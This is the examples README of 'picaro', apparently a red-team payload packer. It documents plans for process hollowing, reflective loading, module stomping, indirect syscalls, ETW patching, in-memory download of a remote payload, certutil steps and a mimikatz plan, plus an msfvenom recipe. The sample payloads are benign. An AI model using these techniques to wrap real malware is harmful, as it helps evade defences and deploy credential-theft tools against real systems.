# Examples

Small, runnable plans live in `examples/plans/`. Run any of them from the
repository root — through the Docker wrapper (recommended; needs only Docker and
Python) or a local build:

```bash
python scripts/picaro.py build examples/plans/<name>.yaml   # recommended
cargo run -- build examples/plans/<name>.yaml               # local build
```

| Plan | What it demonstrates |
| --- | --- |
| `process-hollowing.yaml` | The default Execution technique: run the payload inside a suspended `svchost.exe`. |
| `reflective-loading.yaml` | Manual mapping into the packed binary's own process. |
| `shellcode.yaml` | A raw shellcode payload (`format: shellcode`); the blob is `mov eax, 42; ret`. |
| `in-process-runners.yaml` | The three in-process runners chained — `fibers` → `module_stomping` → `execution_callbacks` — each returning control to the loader. |
| `dotnet.yaml` | A managed (.NET) payload (`format: dotnet` + `dotnet_hosting`): the stub hosts the CLR and runs the assembly from memory. |
| `x86.yaml` | A 32-bit build (`arch: x86`): an i686 stub and a PE32 payload, run under WOW64 on 64-bit Windows. |
| `args.yaml` | `build.payloads.<name>.args` and `args_mode` — YAML args plus the packed binary's own. |
| `custom-stub.yaml` | `build.stub.path`: replace the builtin stub with your own Rust template. |
| `multistage.yaml` | A flat `runtime:` chain: two shellcodes and a `living_off_the_land` command in one artifact. |
| `multistage-advanced.yaml` | A richer chain: a `bouncer` gate, indirect syscalls, a `certutil` step, a hollowed EXE, a sleep and a detached proxy. |
| `lab-signed.yaml` | A self-signed (`mode: lab`) Authenticode signature and an embedded VERSIONINFO. |
| `dll.yaml` | `output.kind: dll`: the chain ships as a DLL a host process loads (JVM `System.load`, CPython `ctypes`, `rundll32`) instead of a standalone executable. Its payload opens a modal dialog (the visible check). |
| `dll-shellcode.yaml` | The same `kind: dll` build with a shellcode payload: the chain returns 42, so every host example in `examples/hosts/` reports a value. |
| `shellcode-output.yaml` | `output.kind: shellcode`: the packed DLL wrapped in a reflective loader (sRDI) and emitted as raw `.bin` — no PE on disk. Verified on the lab host (see `docs/design/shellcode-output.md`). |
| `mimikatz.yaml` | A full-featured plan: remote payload URL, indirect syscalls, API resolution (import proxying), `patch_etw`, randomized VERSIONINFO and a lab signature. |

## Recipe: pack an msfvenom payload

```bash
msfvenom -p windows/x64/exec CMD=calc.exe -f exe -o payload.exe
```

```yaml
schema: 6
name: demo

build:
  crypto:
    algo: xchacha20poly1305
    key: random
  payloads:
    implant:
      source: ./payload.exe
      format: pe
  output:
    path: ./dist/demo.exe
    arch: x64
    strip: true
    trim_paths: all

runtime:
  - technique: reflective_loading
    params: { payload: implant }
```

```bash
cargo run -- build payload.yaml
```

The full walk-through is [Getting started](../getting-started.md).

## Recipe: pack a payload from a URL

`build.payloads.<name>.source` accepts `http(s)://`; the input is fetched **in
memory** and never written to disk. Pin it with `sha256` (64 hex characters) so
a changed URL cannot silently change what gets packed:

```yaml
build:
  payloads:
    implant:
      source: "https://example.invalid/payload.exe"
      # sha256: "<the expected 64-hex digest>"
```

## Recipe: one plan, several targets

Positional args after the plan path are substituted as `$arg.0$`, `$arg.1$`,
…:

```bash
picaro build plan.yaml "C:\\Windows\\System32\\svchost.exe"
```

```yaml
runtime:
  - technique: process_hollowing
    params:
      target: "$arg.0$"
```

## End-to-end tests

--8<-- "examples/README.md"
